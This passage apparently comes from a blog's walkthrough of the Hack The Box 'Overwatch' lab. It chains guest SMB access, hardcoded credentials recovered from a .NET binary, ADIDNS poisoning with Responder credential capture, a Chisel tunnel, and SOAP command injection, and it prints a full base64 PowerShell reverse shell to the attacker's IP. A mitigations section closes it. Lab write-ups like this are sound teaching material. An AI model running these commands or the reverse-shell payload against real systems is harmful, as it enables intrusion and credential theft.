+<pre><code>SMB         10.129.59.40    445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.59.40    445    S200401          [+] overwatch.htb\guest: 
+SMB         10.129.59.40    445    S200401          [*] Enumerated shares
+SMB         10.129.59.40    445    S200401          Share           Permissions     Remark
+SMB         10.129.59.40    445    S200401          -----           -----------     ------
+SMB         10.129.59.40    445    S200401          ADMIN$                          Remote Admin
+SMB         10.129.59.40    445    S200401          C$                              Default share
+SMB         10.129.59.40    445    S200401          IPC$            READ            Remote IPC
+SMB         10.129.59.40    445    S200401          NETLOGON                        Logon server share 
+SMB         10.129.59.40    445    S200401          software$       READ            
+SMB         10.129.59.40    445    S200401          SYSVOL                          Logon server share
+</code></pre>
+<p>The <code>software$</code> share is readable without authentication. The dollar sign suffix (<code>$</code>) is a <a href="https://support.microsoft.com/en-us/topic/how-to-create-a-hidden-share-in-windows-2c7fef5c-c12b-0c8a-2b7d-01f6e7e9c6f0">Windows convention for hidden administrative shares</a> — they don't appear in Windows Explorer but remain fully accessible to anyone who knows the name. We connect using <a href="https://www.samba.org/samba/docs/current/man-html/smbclient.1.html">smbclient</a> and navigate into the <code>Monitoring</code> directory:</p>
+<pre><code class="lang-bash">smbclient //10.129.59.40/software$ -U 'guest'
+</code></pre>
+<pre><code>smb: \&gt; ls
+  .                                  DH        0  Fri May 16 20:27:07 2025
+  ..                                DHS        0  Thu Jan  1 01:46:47 2026
+  Monitoring                         DH        0  Fri May 16 20:32:43 2025
+
+smb: \&gt; cd Monitoring
+smb: \Monitoring\&gt; ls
+  .                                  DH        0  Fri May 16 20:32:43 2025
+  ..                                 DH        0  Fri May 16 20:27:07 2025
+  EntityFramework.dll                AH  4991352  Thu Apr 16 15:38:42 2020
+  EntityFramework.SqlServer.dll      AH   591752  Thu Apr 16 15:38:56 2020
+  EntityFramework.SqlServer.xml      AH   163193  Thu Apr 16 15:38:56 2020
+  EntityFramework.xml                AH  3738289  Thu Apr 16 15:38:40 2020
+  Microsoft.Management.Infrastructure.dll     AH    36864  Mon Jul 17 09:46:10 2017
+  overwatch.exe                      AH     9728  Fri May 16 20:19:24 2025
+  overwatch.exe.config               AH     2163  Fri May 16 20:02:30 2025
+  overwatch.pdb                      AH    30208  Fri May 16 20:19:24 2025
+  System.Data.SQLite.dll             AH   450232  Sun Sep 29 15:41:18 2024
+  System.Data.SQLite.EF6.dll         AH   206520  Sun Sep 29 15:40:06 2024
+  System.Data.SQLite.Linq.dll        AH   206520  Sun Sep 29 15:40:42 2024
+  System.Data.SQLite.xml             AH  1245480  Sat Sep 28 13:48:00 2024
+  System.Management.Automation.dll     AH   360448  Mon Jul 17 09:46:10 2017
+  System.Management.Automation.xml     AH  7145771  Mon Jul 17 09:46:10 2017
+  x64                                DH        0  Fri May 16 20:32:33 2025
+  x86                                DH        0  Fri May 16 20:32:33 2025
+</code></pre>
+<p>The DLLs present tell us a lot about the application before even opening it. <a href="https://learn.microsoft.com/en-us/ef/">EntityFramework.dll</a> is Microsoft's ORM (Object-Relational Mapper), strongly suggesting the app reads from or writes to a SQL database. <code>System.Data.SQLite.dll</code> indicates local SQLite usage, possibly for caching. <code>System.Management.Automation.dll</code> is the PowerShell engine DLL, meaning the app likely invokes PowerShell commands internally. Most importantly, both <code>overwatch.exe</code> and <code>overwatch.pdb</code> are present — the <a href="https://learn.microsoft.com/en-us/visualstudio/debugger/specify-symbol-dot-pdb-and-source-files-in-the-visual-studio-debugger">PDB (Program Database)</a> file contains debug symbols that reconstruct original variable and method names during decompilation, making reverse engineering significantly cleaner.</p>
+<p>We download both the executable and its config file:</p>
+<pre><code class="lang-bash">smb: \Monitoring\&gt; mget overwatch.exe
+Get file overwatch.exe? y
+getting file \Monitoring\overwatch.exe of size 9728 as overwatch.exe (7.2 KiloBytes/sec) (average 7.2 KiloBytes/sec)
+smb: \Monitoring\&gt; mget overwatch.exe.config
+Get file overwatch.exe.config? y
+getting file \Monitoring\overwatch.exe.config of size 2163 as overwatch.exe.config (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec)
+</code></pre>
+<h3 id="app-config-exposure">App Config Exposure</h3>
+<p>Before even opening the binary, <code>overwatch.exe.config</code> already yields valuable information. This is a standard <a href="https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/">.NET application configuration file</a> that controls runtime behavior — connection strings, endpoints, service bindings, and more. Inspecting it reveals the base address where the application hosts its WCF service:</p>
+<pre><code class="lang-xml">...
+          &lt;baseAddresses&gt;
+            &lt;add baseAddress=&quot;http://overwatch.htb:8000/MonitorService&quot; /&gt;
+          &lt;/baseAddresses&gt;
+...
+</code></pre>
+<p>This tells us the application exposes a SOAP service at <code>http://overwatch.htb:8000/MonitorService</code>. Port 8000 was not reachable externally in our initial scan, meaning it is likely firewalled and only accessible from inside the machine — something to revisit once we have a foothold.</p>
+<blockquote>
+<p><strong>Note:</strong> Always read config files before jumping into reverse engineering the binary. They frequently expose endpoint URLs, connection strings, feature flags, and other details that save significant time.</p>
+</blockquote>
+<h3 id="net-reverse-engineering">.NET Reverse Engineering</h3>
+<p><a href="https://github.com/dnSpy/dnSpy">DNSpy</a> is the standard tool for .NET reverse engineering. Unlike native compiled languages (C, C++), .NET assemblies compile to <a href="https://learn.microsoft.com/en-us/dotnet/standard/managed-code">CIL (Common Intermediate Language)</a> bytecode rather than machine code. This means they can be decompiled almost perfectly back to C# source — no reading raw assembly required. We open <code>overwatch.exe</code> in DNSpy and browse the decompiled source tree. Inside the application logic, we find a database connection string with credentials hardcoded directly in the source:</p>
+<img alt="DNSpy decompiled source showing hardcoded SQL Server credentials inside overwatch.exe" src="https://raw.githubusercontent.com/zirov/images/refs/heads/main/writeups/overwatch-htb/img01.png" />
+<p><strong>Credentials found:</strong> <code>sqlsvc : TI0LKcfHzZw1Vv;</code></p>
+<blockquote>
+<p><strong>Note:</strong> Hardcoded credentials inside compiled binaries are a surprisingly common finding. Developers sometimes embed connection strings thinking compiled code is "safe" and won't be read by end users. Here, the binary was deployed to a network share with guest read access — compounding the misconfiguration significantly. This is a textbook case of <a href="https://cwe.mitre.org/data/definitions/798.html">CWE-798: Use of Hard-coded Credentials</a>.</p>
+</blockquote>
+<h3 id="mssql-enum">MSSQL Enum</h3>
+<p>With credentials in hand, we validate them against the SQL Server instance using NetExec's MSSQL module:</p>
+<pre><code class="lang-bash">nxc mssql S200401.overwatch.htb -u sqlsvc -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --port 6520
+</code></pre>
+<pre><code>MSSQL       10.129.59.40    6520   S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb) (EncryptionReq:False)
+MSSQL       10.129.59.40    6520   S200401          [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv
+</code></pre>
+<p>Authentication succeeds. We connect interactively using <a href="https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py">mssqlclient.py</a> from <a href="https://github.com/fortra/impacket">Impacket</a>. The <code>-windows-auth</code> flag tells Impacket to authenticate using <a href="https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/windows-authentication-overview">NTLM/Windows Authentication</a> as a domain account rather than SQL Server native auth:</p>
+<pre><code class="lang-bash">mssqlclient.py overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv@S200401.overwatch.htb -port 6520 -windows-auth
+</code></pre>
+<pre><code>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(S200401\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
+[!] Press help for extra shell commands
+SQL (OVERWATCH\sqlsvc  guest@master)&gt;
+</code></pre>
+<p>We have an interactive SQL shell. The first thing to enumerate is <a href="https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine">Linked Servers</a> — a SQL Server feature that allows one instance to execute T-SQL queries against a remote SQL Server (or other OLE DB data source) as if it were local. In pentesting, linked servers are a well-known <a href="https://www.thehacker.recipes/ad/movement/mssql-abuse">lateral movement vector</a> because you can chain queries across servers and sometimes escalate privileges if the remote server runs queries under a more privileged account.</p>
+<pre><code class="lang-sql">EXEC sp_linkedservers;
+</code></pre>
+<pre><code>SRV_NAME             SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE       SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
+------------------   ----------------   -----------   ------------------   ------------------   ------------   -------   
+S200401\SQLEXPRESS   SQLNCLI            SQL Server    S200401\SQLEXPRESS   NULL                 NULL           NULL      
+SQL07                SQLNCLI            SQL Server    SQL07                NULL                 NULL           NULL
+</code></pre>
+<p>There is a linked server named <code>SQL07</code> pointing to a host also called <code>SQL07</code>. We attempt to execute a query on it to test connectivity:</p>
+<pre><code class="lang-sql">EXEC ('SELECT @@version') AT SQL07;
+</code></pre>
+<pre><code>INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider &quot;MSOLEDBSQL&quot; for linked server &quot;SQL07&quot; returned message &quot;Login timeout expired&quot;.
+INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider &quot;MSOLEDBSQL&quot; for linked server &quot;SQL07&quot; returned message &quot;A network-related or instance-specific error has occurred while establishing a connection to SQL Server. Server is not found or not accessible. Check if instance name is correct and if SQL Server is configured to allow remote connections. For more information see SQL Server Books Online.&quot;.
+ERROR(MSOLEDBSQL): Line 0: Named Pipes Provider: Could not open a connection to SQL Server [64].
+</code></pre>
+<p>The connection times out because <code>SQL07</code> cannot be resolved — it does not exist as a DNS record in the domain. This is the critical gap we will exploit in the next stage.</p>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="adidns-poisoning">ADIDNS Poisoning</h3>
+<p><a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/ad-integrated-dns-zone-replication">Active Directory Integrated DNS (ADIDNS)</a> stores DNS records directly inside the Active Directory database and replicates them automatically across all Domain Controllers. By default, <strong>any authenticated domain user can create new DNS A records</strong> in the domain zone via LDAP — a well-documented design behavior first researched extensively by <a href="https://blog.netspi.com/adidns-revisited/">Kevin Robertson of NetSPI</a>.</p>
+<p>Since <code>SQL07</code> has no DNS record, we register it as an A record pointing to our attack machine IP (<code>10.10.15.204</code>). When the SQL Server on <code>S200401</code> next tries to connect to the linked server <code>SQL07</code>, the name will now resolve to us. If the linked server was configured with stored credentials, those credentials will be sent to whoever <code>SQL07</code> resolves to — in this case, our listener.</p>
+<p>We use <a href="https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py">dnstool.py</a> from <a href="https://github.com/dirkjanm/krbrelayx">krbrelayx</a> by <a href="https://dirkjanm.io/">Dirk-jan Mollema</a> to add the rogue DNS record:</p>
+<pre><code class="lang-bash">python3 dnstool.py -u 'OVERWATCH\sqlsvc' -p 'TI0LKcfHzZw1Vv' -r SQL07 -d 10.10.15.204 --action add --type A 10.129.59.40 
+</code></pre>
+<pre><code>[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Adding new record
+[+] LDAP operation completed successfully
+</code></pre>
+<p>We verify the record is live and resolves correctly:</p>
+<pre><code class="lang-bash">nslookup SQL07.overwatch.htb 10.129.59.40
+</code></pre>
+<pre><code>Server:     10.129.59.40
+Address:    10.129.59.40#53
+
+Name:   SQL07.overwatch.htb
+Address: 10.10.15.204
+</code></pre>
+<p>The DNS A record <code>SQL07 → 10.10.15.204</code> is now active in the domain. We start <a href="https://github.com/lgandx/Responder">Responder</a> on the VPN interface to intercept the incoming connection:</p>
+<pre><code class="lang-bash">sudo responder -I tun0
+</code></pre>
+<p>Back in our MSSQL shell, we retrigger the linked server connection attempt:</p>
+<pre><code class="lang-sql">EXEC ('SELECT @@version') AT SQL07;
+</code></pre>
+<p>Responder captures the authentication in <strong>cleartext</strong>:</p>
+<pre><code>[MSSQL] Received connection from 10.129.58.181
+[MSSQL] Cleartext Client   : 10.129.58.181
+[MSSQL] Cleartext Hostname : SQL07 ()
+[MSSQL] Cleartext Username : sqlmgmt
+[MSSQL] Cleartext Password : bIhBbzMMnB82yx
+</code></pre>
+<blockquote>
+<p><strong>Note:</strong> We receive cleartext credentials rather than an NTLM hash because the linked server was configured using <strong>stored SQL credentials</strong> — a username/password pair saved directly in the SQL Server configuration — rather than <a href="https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine#security">Windows Integrated Authentication (Kerberos/NTLM)</a>. When the SQL Server initiates the outbound connection, it sends those stored credentials directly to whatever host <code>SQL07</code> resolves to. Since we are now <code>SQL07</code>, Responder receives them before any encryption negotiation takes place.</p>
+</blockquote>
+<p><strong>New credentials:</strong> <code>sqlmgmt : bIhBbzMMnB82yx</code></p>
+<p>We verify WinRM access for this user:</p>
+<pre><code class="lang-bash">nxc winrm S200401.overwatch.htb -u 'sqlmgmt' -p 'bIhBbzMMnB82yx' 
+</code></pre>
+<pre><code>WINRM       10.129.59.40    5985   S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb) 
+WINRM       10.129.59.40    5985   S200401          [+] overwatch.htb\sqlmgmt:bIhBbzMMnB82yx (Pwn3d!)
+</code></pre>
+<p><code>(Pwn3d!)</code> confirms the user is a member of the <a href="https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/allow-log-on-through-remote-desktop-services">Remote Management Users</a> group. We open a shell with <a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a>:</p>
+<pre><code class="lang-bash">evil-winrm -i S200401.overwatch.htb -u 'sqlmgmt' -p 'bIhBbzMMnB82yx'
+</code></pre>
+<pre><code>Evil-WinRM shell v3.9
+
+Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\sqlmgmt\Documents&gt;
+</code></pre>
+<pre><code class="lang-powershell">*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop&gt; hostname ; whoami ; ipconfig ; type user.txt
+</code></pre>
+<pre><code>S200401
+overwatch\sqlmgmt
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::bb
+   IPv6 Address. . . . . . . . . . . : dead:beef::cb4b:6f65:5978:76e9
+   Link-local IPv6 Address . . . . . : fe80::61f2:523e:89cb:36d2%3
+   IPv4 Address. . . . . . . . . . . : 10.129.59.40
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb0:70fa%3
+                                       10.129.0.1
+0424b40df18a02c8cd580881cc0d****
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="netstat-enumeration">Netstat Enumeration</h3>
+<p>A key step in local Windows enumeration is identifying ports that are listening internally but not exposed externally. These can reveal services deliberately kept off the network that are still reachable from our local session:</p>
+<pre><code class="lang-bash">netstat -ano | findstr LISTEN
+</code></pre>
+<pre><code>TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       692
+TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       936
+TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       692
+TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       692
+TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       936
+TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       692
+TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       692
+TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       692
+TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       824
+TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
+TCP    0.0.0.0:6520           0.0.0.0:0              LISTENING       5332
+TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4
+  ...
+</code></pre>
+<p>Port <strong>8000</strong> is actively listening — exactly what <code>overwatch.exe.config</code> had already told us to expect. A local firewall rule is blocking external access, which is why it didn't appear in our initial Nmap scan. We need to tunnel through our existing WinRM session to reach it from outside.</p>
+<h3 id="port-forwarding">Port Forwarding</h3>
+<p><a href="https://github.com/jpillora/chisel">Chisel</a> is a fast TCP/UDP tunneling tool written in Go that runs over HTTP. It supports a reverse mode where the victim connects outbound to our server, giving us local access to the forwarded port — ideal for environments where inbound connections to the victim are firewalled.</p>
+<p><strong>Step 1 — Upload the binary</strong> through Evil-WinRM:</p>
+<pre><code class="lang-bash">upload /home/z1rov/CTF/Overwatch/exploit/chisel/chisel.exe
+</code></pre>
+<pre><code>Info: Uploading /home/z1rov/CTF/Overwatch/exploit/chisel/chisel.exe to C:\Users\sqlmgmt\Documents\chisel.exe
+Data: 14575616 bytes of 14575616 bytes copied
+Info: Upload successful!
+</code></pre>
+<p><strong>Step 2 — Start the Chisel server</strong> on the attack machine in reverse mode:</p>
+<pre><code class="lang-bash">chisel server -p 9000 --reverse
+</code></pre>
+<pre><code>2026/05/09 01:28:37 server: Reverse tunnelling enabled
+2026/05/09 01:28:37 server: Fingerprint a5ncjQOVgmm6zpWGxbTEiFyGIei446orcWLQ2OdpXTs=
+2026/05/09 01:28:37 server: Listening on http://0.0.0.0:9000
+</code></pre>
+<p><strong>Step 3 — Connect back from the victim</strong>, creating a reverse tunnel that forwards remote port 8000 to our local port 8000:</p>
+<pre><code class="lang-bash">./chisel.exe client 10.10.15.204:9000 R:8000:127.0.0.1:8000
+</code></pre>
+<pre><code>2026/05/08 21:28:46 client: Connected (Latency 132.82ms)
+</code></pre>
+<p>The server confirms the tunnel is established:</p>
+<pre><code>2026/05/09 01:28:43 server: session#1: Client version (1.11.5) differs from server version (1.11.6)
+2026/05/09 01:28:43 server: session#1: tun: proxy#R:8000=&gt;8000: Listening
+</code></pre>
+<p>Port 8000 is now accessible locally at <code>http://127.0.0.1:8000</code>.</p>
+<h3 id="soap-service-enum">SOAP Service Enum</h3>
+<p>Browsing to <code>http://127.0.0.1:8000/MonitorService</code> confirms what the config file had already told us — a <a href="https://learn.microsoft.com/en-us/dotnet/framework/wcf/whats-wcf">WCF (Windows Communication Foundation)</a> SOAP service is running here:</p>
+<img alt="MonitorService WCF SOAP service running internally on port 8000, accessed after tunneling with Chisel" src="https://raw.githubusercontent.com/zirov/images/refs/heads/main/writeups/overwatch-htb/img02.png" />
+<p><a href="https://www.w3.org/TR/soap/">SOAP (Simple Object Access Protocol)</a> is an XML-based messaging protocol used to expose remote functionality over HTTP. We enumerate the available operations by fetching the <a href="https://www.w3.org/TR/wsdl/">WSDL (Web Services Description Language)</a> definition — the machine-readable contract that describes every method, input parameter, and return type the service exposes:</p>
+<pre><code>http://127.0.0.1:8000/MonitorService?singleWsdl
+</code></pre>
+<img alt="WSDL definition of the MonitorService showing all available operations including KillProcess with its processName parameter" src="https://raw.githubusercontent.com/zirov/images/refs/heads/main/writeups/overwatch-htb/img03.png" />
+<p>The WSDL reveals a <code>KillProcess</code> operation that accepts a single string parameter named <code>processName</code>. Any operation that takes a free-form string and passes it to a system-level function is an immediate command injection candidate.</p>
+<h3 id="soap-command-injection">SOAP Command Injection</h3>
+<p><strong>Vulnerability:</strong> Unsanitized command injection in the <code>KillProcess</code> SOAP operation.</p>
+<p><strong>Root cause:</strong> The <code>processName</code> parameter is passed directly to an underlying system call — likely <code>taskkill.exe</code> or a shell invocation — without any input validation or sanitization. By injecting a semicolon followed by an arbitrary command, we terminate the intended process name argument and execute our own command in the same shell context. Since the WCF service runs as <code>NT AUTHORITY\SYSTEM</code>, any injected commands inherit full system privileges.</p>
+<p>We send a crafted SOAP request to test with <code>whoami</code>:</p>
+<pre><code class="lang-http">POST /MonitorService HTTP/1.1
+Host: 127.0.0.1:8000
+Content-Type: text/xml; charset=utf-8
+SOAPAction: &quot;http://tempuri.org/IMonitoringService/KillProcess&quot;
+Content-Length: 278
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+  &lt;soap:Body&gt;
+    &lt;KillProcess xmlns=&quot;http://tempuri.org/&quot;&gt;
+      &lt;processName&gt;notepad; whoami #&lt;/processName&gt;
+    &lt;/KillProcess&gt;
+  &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;
+</code></pre>
+<p>The injection logic works as follows: <code>notepad</code> satisfies the expected process name argument; <code>;</code> terminates that command; <code>whoami</code> is our injected command; <code>#</code> comments out any trailing arguments the service may append after our input.</p>
+<img alt="SOAP service response confirming whoami output as NT AUTHORITY\SYSTEM, proving the command injection works" src="https://raw.githubusercontent.com/zirov/images/refs/heads/main/writeups/overwatch-htb/img04.png" />
+<p>With confirmed command execution as SYSTEM, we generate a reverse shell payload using <a href="https://www.revshells.com/">Reverse Shell Generator</a> and deliver it through <a href="https://portswigger.net/burp">Burp Suite</a> Repeater:</p>
+<img alt="Reverse shell payload generated and loaded into Burp Suite Repeater targeting the KillProcess parameter" src="https://raw.githubusercontent.com/zirov/images/refs/heads/main/writeups/overwatch-htb/img05.png" />
+<pre><code class="lang-http">POST /MonitorService HTTP/1.1
+Host: 127.0.0.1:8000
+Content-Type: text/xml; charset=utf-8
+SOAPAction: &quot;http://tempuri.org/IMonitoringService/KillProcess&quot;
+Content-Length: 278
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+  &lt;soap:Body&gt;
+    &lt;KillProcess xmlns=&quot;http://tempuri.org/&quot;&gt;
+      &lt;processName&gt;notepad; powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMgAwADQAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA #&lt;/processName&gt;
+    &lt;/KillProcess&gt;
+  &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;
+</code></pre>
+<img alt="Burp Suite Repeater showing the full SOAP request with the reverse shell injected into processName, ready to fire" src="https://raw.githubusercontent.com/zirov/images/refs/heads/main/writeups/overwatch-htb/img06.png" />
+<pre><code class="lang-bash">nc -lnvp 9001
+</code></pre>
+<pre><code>Listening on 0.0.0.0 9001
+Connection received on 10.129.244.81 51551
+
+PS C:\Software\Monitoring&gt; whoami
+nt authority\system
+PS C:\Software\Monitoring&gt;
+</code></pre>
+<h2 id="post-exploitation">Post Exploitation</h2>
+<pre><code class="lang-powershell">PS C:\users\Administrator\Desktop&gt; hostname ; whoami ; ipconfig ; type root.txt
+</code></pre>
+<pre><code>S200401
+nt authority\system
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::bb
+   IPv6 Address. . . . . . . . . . . : dead:beef::cb4b:6f65:5978:76e9
+   Link-local IPv6 Address . . . . . : fe80::61f2:523e:89cb:36d2%3
+   IPv4 Address. . . . . . . . . . . : 10.129.59.40
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb0:70fa%3
+                                       10.129.0.1
+7546eadc4804d7ae834a4f5650f8****
+</code></pre>
+<h2 id="mitigations">Mitigations</h2>
+<p>Each vulnerability in this chain has a straightforward remediation. Addressing any single one of them would have broken the attack at that stage.</p>
+<p><strong>Remove guest access to SMB shares.</strong> The <code>software$</code> share should require authentication. Internal tooling and monitoring binaries have no reason to be readable by unauthenticated users. Review all shares with <code>net share</code> and enforce explicit ACLs.</p>
+<p><strong>Never hardcode credentials in application binaries.</strong> Connection strings and secrets should be stored in a secrets manager (e.g. <a href="https://learn.microsoft.com/en-us/azure/key-vault/">Azure Key Vault</a>, Windows DPAPI, or environment variables injected at runtime). Compiled .NET assemblies can be decompiled trivially — treat them the same as source code from a secrets hygiene perspective. Reference: <a href="https://cwe.mitre.org/data/definitions/798.html">CWE-798</a>.</p>
+<p><strong>Resolve or remove orphaned Linked Server targets.</strong> The <code>SQL07</code> linked server pointed to a hostname with no DNS record. A linked server that cannot resolve its target is either unused or misconfigured — either way it should be dropped. If the linked server is needed, ensure the target host exists and is reachable before deployment. Audit all linked servers with <code>EXEC sp_linkedservers</code> and remove any that are stale.</p>
+<p><strong>Use Windows Integrated Authentication for Linked Servers.</strong> Storing plaintext credentials in a linked server configuration (<code>sp_addlinkedsrvlogin</code> with explicit username/password) means those credentials are sent in cleartext to whatever the target hostname resolves to. Configuring the linked server to use the SQL Server service account's Kerberos identity instead eliminates the credential capture risk entirely.</p>
+<p><strong>Restrict ADIDNS write permissions.</strong> The default behavior that allows any authenticated domain user to register arbitrary DNS A records is a known attack primitive. This can be mitigated by enabling the <code>ms-DS-MachineAccountQuota</code>-equivalent DNS ACL restriction or by deploying <a href="https://learn.microsoft.com/en-us/windows-server/networking/dns/deploy/dnssec">DNS Security (DNSSEC)</a> and auditing dynamic DNS updates. At minimum, monitor for unexpected DNS record creation events (Event ID 770 in the DNS debug log).</p>
+<p><strong>Sanitize all inputs to system-level calls.</strong> The <code>KillProcess</code> SOAP operation passes the caller-supplied <code>processName</code> directly to a shell or system API without validation. Any parameter that influences a command execution must be strictly validated — ideally by allowlisting known process names rather than attempting to blacklist injection characters. The principle of least privilege also applies here: a monitoring service has no legitimate reason to run as <code>NT AUTHORITY\SYSTEM</code>. Running it as a restricted service account would limit the blast radius of exploitation.</p>
+<hr />
+<p><strong>Tools used:</strong> <a href="https://nmap.org/">Nmap</a> · <a href="https://github.com/Pennyw0rth/NetExec">NetExec</a> · <a href="https://www.samba.org/samba/docs/current/man-html/smbclient.1.html">smbclient</a> · <a href="https://github.com/dnSpy/dnSpy">DNSpy</a> · <a href="https://github.com/fortra/impacket">Impacket mssqlclient</a> · <a href="https://github.com/dirkjanm/krbrelayx">dnstool.py / krbrelayx</a> · <a href="https://github.com/lgandx/Responder">Responder</a> · <a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a> · <a href="https://github.com/jpillora/chisel">Chisel</a> · <a href="https://portswigger.net/burp">Burp Suite</a></p>
+      </div>
+    </article>
+    <aside class="col-sidebar"></aside>
+  </main>
+  <footer class="site-footer">
+    <div class="footer-main">
+      <div class="footer-col">
+        <div class="footer-col-label">Zirov</div>
